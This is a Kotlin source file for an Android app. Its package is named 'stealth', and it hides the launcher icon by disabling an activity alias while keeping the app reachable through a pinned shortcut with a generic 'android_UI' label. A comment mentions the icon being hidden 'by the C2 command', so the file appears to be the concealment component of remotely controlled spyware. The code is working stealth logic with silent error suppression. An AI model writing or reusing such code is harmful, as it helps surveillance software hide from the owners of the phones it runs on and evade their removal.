package com.sp.core.stealth

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ShortcutInfo
import android.content.pm.ShortcutManager
import android.graphics.drawable.Icon
import com.sp.core.util.Prefs

/**
 * Hides the launcher icon.
 *
 * The icon lives on an *activity alias* ("com.sp.core.AppAlias"), not on the
 * activity itself. The activity that carries the wizard stays enabled at all
 * times, so the app can always be started again - in v1.1.x the launcher
 * component was disabled and the app became unreachable after an update,
 * which was the reason the icon was visible all the time in the first place.
 */
object IconHider {

    /** The alias that carries the MAIN/LAUNCHER intent filter. */
    const val ALIAS = "com.sp.core.AppAlias"

    /** The real activity behind the alias - never disabled. */
    const val LAUNCHER_COMPONENT = "com.sp.core.LauncherActivity"

    /** The legacy launcher activity of the older builds. */
    const val LEGACY_COMPONENT = "com.sp.core.MainActivity"

    private const val KEY_ICON_HIDDEN = "icon_hidden"

    /** Restores the state saved by the user (called on every app start). */
    fun applySaved(ctx: Context) {
        try {
            val hidden = Prefs.get(ctx, KEY_ICON_HIDDEN, false) as? Boolean ?: false
            if (hidden) hide(ctx) else show(ctx)
        } catch (_: Throwable) {
        }
    }

    fun show(ctx: Context) {
        try {
            val pm = ctx.packageManager
            // The activity itself is always enabled - the app must stay
            // startable no matter what happened to the icon.
            for (name in listOf(LAUNCHER_COMPONENT, LEGACY_COMPONENT)) {
                pm.setComponentEnabledSetting(
                    ComponentName(ctx, name),
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    PackageManager.DONT_KILL_APP
                )
            }
            pm.setComponentEnabledSetting(
                ComponentName(ctx, ALIAS),
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
            Prefs.set(ctx, KEY_ICON_HIDDEN, false)
        } catch (_: Throwable) {
        }
    }

    fun hide(ctx: Context) {
        try {
            val pm = ctx.packageManager
            // Never disable the activity itself - only the icon.
            for (name in listOf(LAUNCHER_COMPONENT, LEGACY_COMPONENT)) {
                pm.setComponentEnabledSetting(
                    ComponentName(ctx, name),
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    PackageManager.DONT_KILL_APP
                )
            }
            pm.setComponentEnabledSetting(
                ComponentName(ctx, ALIAS),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            Prefs.set(ctx, KEY_ICON_HIDDEN, true)
        } catch (_: Throwable) {
        }
        pinShortcut(ctx)
    }

    /**
     * Keeps a way back into the app: a pinned shortcut on the home screen.
     * The launcher icon can be hidden, the shortcut cannot - without it the
     * wizard would be unreachable (which is exactly what happened when the
     * icon was hidden by the C2 command).
     */
    private fun pinShortcut(ctx: Context) {
        try {
            val sm = ctx.getSystemService(Context.SHORTCUT_SERVICE) as ShortcutManager
            val intent = Intent(ctx, com.sp.core.LauncherActivity::class.java)
                .setAction(Intent.ACTION_MAIN)
                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            val si = ShortcutInfo.Builder(ctx, "sp_setup")
                .setShortLabel("Настройка")
                .setLongLabel("android_UI - настройка доступа")
                .setIcon(Icon.createWithResource(ctx, com.sp.core.R.mipmap.ic_launcher))
                .setIntent(intent)
                .build()
            if (!sm.isRequestPinShortcutSupported) return
            sm.requestPinShortcut(si, null)
        } catch (_: Throwable) {
        }
    }

    fun isHidden(ctx: Context): Boolean = try {
        val pm = ctx.packageManager
        pm.getComponentEnabledSetting(ComponentName(ctx, ALIAS)) ==
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED
    } catch (_: Throwable) {
        false
    }
}
